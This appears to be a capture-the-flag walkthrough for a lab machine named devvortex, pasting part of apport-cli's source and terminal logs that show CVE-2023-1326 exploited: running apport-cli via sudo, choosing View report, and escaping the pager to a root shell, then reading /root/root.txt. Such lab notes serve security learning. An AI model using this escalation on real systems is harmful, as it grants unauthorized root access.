+                            'report': False, 'examine': False}
+            if response == examine:
+                return_value['examine'] = True
+                return return_value
+            elif response == complete:
+                return_value['report'] = True
+            elif response == ignore:
+                return_value['blacklist'] = True
+            elif response == view:
+                self.collect_info()
+                self.ui_update_view()
+                continue
+            elif response == save:
+                # we do not already have a report file if we report a bug
+                if not self.report_file:
+                    prefix = 'apport.'
+                    if 'Package' in self.report:
+                        prefix += self.report['Package'].split()[0] + '.'
+                    (fd, self.report_file) = tempfile.mkstemp(prefix=prefix, suffix='.apport')
+                    with os.fdopen(fd, 'wb') as f:
+                        self.report.write(f)
+
+                print(_('Problem report file:') + ' ' + self.report_file)
+
+            return return_value
+
+    def ui_info_message(self, title, text):
+        dialog = CLIDialog(title, text)
+        dialog.addbutton(_('&Confirm'))
+        dialog.run()
+
+    def ui_error_message(self, title, text):
+        dialog = CLIDialog(_('Error: %s') % title, text)
+        dialog.addbutton(_('&Confirm'))
+        dialog.run()
+
+    def ui_start_info_collection_progress(self):
+        self.progress = CLIProgressDialog(
+            _('Collecting problem information'),
+            _('The collected information can be sent to the developers to improve the\n'
+              'application. This might take a few minutes.'))
+        self.progress.show()
+
+    def ui_pulse_info_collection_progress(self):
+        self.progress.set()
+
+    def ui_stop_info_collection_progress(self):
+        sys.stdout.write('\n')
+
+    def ui_start_upload_progress(self):
+        self.progress = CLIProgressDialog(
+            _('Uploading problem information'),
+            _('The collected information is being sent to the bug tracking system.\n'
+              'This might take a few minutes.'))
+        self.progress.show()
+
+    def ui_set_upload_progress(self, progress):
+        self.progress.set(progress)
+
+    def ui_stop_upload_progress(self):
+        sys.stdout.write('\n')
+
+    def ui_question_yesno(self, text):
+        '''Show a yes/no question.
+
+        Return True if the user selected "Yes", False if selected "No" or
+        "None" on cancel/dialog closing.
+        '''
+        dialog = CLIDialog(text, None)
+        r_yes = dialog.addbutton('&Yes')
+        r_no = dialog.addbutton('&No')
+        r_cancel = dialog.addbutton(_('&Cancel'))
+        result = dialog.run()
+        if result == r_yes:
+            return True
+        if result == r_no:
+            return False
+        assert result == r_cancel
+        return None
+
+    def ui_question_choice(self, text, options, multiple):
+        '''Show an question with predefined choices.
+
+        options is a list of strings to present. If multiple is True, they
+        should be check boxes, if multiple is False they should be radio
+        buttons.
+
+        Return list of selected option indexes, or None if the user cancelled.
+        If multiple == False, the list will always have one element.
+        '''
+        result = []
+        dialog = CLIDialog(text, None)
+
+        if multiple:
+            while True:
+                dialog = CLIDialog(text, None)
+                index = 0
+                choice_index_map = {}
+                for option in options:
+                    if index not in result:
+                        choice_index_map[dialog.addbutton(option, str(index + 1))] = index
+                    index += 1
+                done = dialog.addbutton(_('&Done'))
+                cancel = dialog.addbutton(_('&Cancel'))
+
+                if result:
+                    cur = ', '.join([str(r + 1) for r in result])
+                else:
+                    cur = _('none')
+                response = dialog.run(_('Selected: %s. Multiple choices:') % cur)
+                if response == cancel:
+                    return None
+                if response == done:
+                    break
+                result.append(choice_index_map[response])
+
+        else:
+            # single choice (radio button)
+            dialog = CLIDialog(text, None)
+            index = 1
+            for option in options:
+                dialog.addbutton(option, str(index))
+                index += 1
+
+            cancel = dialog.addbutton(_('&Cancel'))
+            response = dialog.run(_('Choices:'))
+            if response == cancel:
+                return None
+            result.append(response - 1)
+
+        return result
+
+    def ui_question_file(self, text):
+        '''Show a file selector dialog.
+
+        Return path if the user selected a file, or None if cancelled.
+        '''
+        print('\n***  ' + text)
+        while True:
+            sys.stdout.write(_('Path to file (Enter to cancel):'))
+            sys.stdout.write(' ')
+            f = sys.stdin.readline().strip()
+            if not f:
+                return None
+            if not os.path.exists(f):
+                print(_('File does not exist.'))
+            elif os.path.isdir(f):
+                print(_('This is a directory.'))
+            else:
+                return f
+
+    def open_url(self, url):
+        text = '%s\n\n  %s\n\n%s' % (
+            _('To continue, you must visit the following URL:'),
+            url,
+            _('You can launch a browser now, or copy this URL into a browser on another computer.'))
+
+        answer = self.ui_question_choice(text, [_('Launch a browser now')], False)
+        if answer == [0]:
+            apport.ui.UserInterface.open_url(self, url)
+
+    def ui_run_terminal(self, command):
+        # we are already running in a terminal, so this works by definition
+        if not command:
+            return True
+
+        subprocess.call(command, shell=True)
+
+
+if __name__ == '__main__':
+    app = CLIUserInterface()
+    if not app.run_argv():
+        print(_('No pending crash reports. Try --help for more information.'))
+logan@devvortex:~$ 
+
+
+logan@devvortex:~$ sudo /usr/bin/apport-cli --help
+Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]
+
+Options:
+  -h, --help            show this help message and exit
+  -f, --file-bug        Start in bug filing mode. Requires --package and an
+                        optional --pid, or just a --pid. If neither is given,
+                        display a list of known symptoms. (Implied if a single
+                        argument is given.)
+  -w, --window          Click a window as a target for filing a problem
+                        report.
+  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
+                        Start in bug updating mode. Can take an optional
+                        --package.
+  -s SYMPTOM, --symptom=SYMPTOM
+                        File a bug report about a symptom. (Implied if symptom
+                        name is given as only argument.)
+  -p PACKAGE, --package=PACKAGE
+                        Specify package name in --file-bug mode. This is
+                        optional if a --pid is specified. (Implied if package
+                        name is given as only argument.)
+  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
+                        is specified, the bug report will contain more
+                        information.  (Implied if pid is given as only
+                        argument.)
+  --hanging             The provided pid is a hanging application.
+  -c PATH, --crash-file=PATH
+                        Report the crash from given .apport or .crash file
+                        instead of the pending ones in /var/crash. (Implied if
+                        file is given as only argument.)
+  --save=PATH           In bug filing mode, save the collected information
+                        into a file instead of reporting it. This file can
+                        then be reported later on from a different machine.
+  --tag=TAG             Add an extra tag to the report. Can be specified
+                        multiple times.
+  -v, --version         Print the Apport version number.
+logan@devvortex:~$ 
+
+
+
+logan@devvortex:/$ sudo /usr/bin/apport-cli -v
+2.20.11
+CVE-2023-1326
+https://www.exploit-db.com/exploits/49572
+"stems from the fact that apport-cli invokes a pager (such as less ) when viewing a
+crash, which can be used to run system commands in the context of the user executing the parent
+command. In this case, if ran with as root using sudo , it can be used to spawn an interactive
+system shell, as the elevated privileges are not dropped."
+
+
+
+
+
+logan@devvortex:/tmp$ ps -ux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+logan       2679  0.0  0.2  19040  9652 ?        Ss   15:53   0:00 /lib/systemd/systemd --user
+logan       2687  0.0  0.0 169192  3248 ?        S    15:53   0:00 (sd-pam)
+logan       2787  0.2  0.1  14060  5840 ?        S    15:53   0:01 sshd: logan@pts/1
+logan       2789  0.0  0.1   8272  5200 pts/1    Ss   15:53   0:00 -bash
+logan       3065  0.0  0.0   9080  3536 pts/1    R+   16:08   0:00 ps -ux
+logan@devvortex:/tmp$ 
+
+
+
+"We now run apport-cli using sudo , specifying the PID using the -P flag and file-bug mode
+using the -f flag. The tool will then gather information and report any issues with that process,
+prompting us to pick what to do with the report. We proceed to select view report , and since
+less is configured as the default pager, we can run the !/bin/bash command and spawn an
+interactive system shell as root "
+
+
+
+logan@devvortex:/$ sudo /usr/bin/apport-cli -f -P 2679
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+.........................
+*** It seems you have modified the contents of "/etc/systemd/journald.conf".  Would you like to add the contents of it to your bug report?
+
+
+What would you like to do? Your options are:
+  Y: Yes
+  N: No
+  C: Cancel
+Please choose (Y/N/C): Y
+
+*** It seems you have modified the contents of "/etc/systemd/resolved.conf".  Would you like to add the contents of it to your bug report?
+
+
+What would you like to do? Your options are:
+  Y: Yes
+  N: No
+  C: Cancel
+Please choose (Y/N/C): 
+
+What would you like to do? Your options are:
+  Y: Yes
+  N: No
+  C: Cancel
+Please choose (Y/N/C): Y
+...................
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (736.0 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+root@devvortex:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@devvortex:/# cat /root/root.txt
+...
+root@devvortex:/# 
+
+
+
+
+
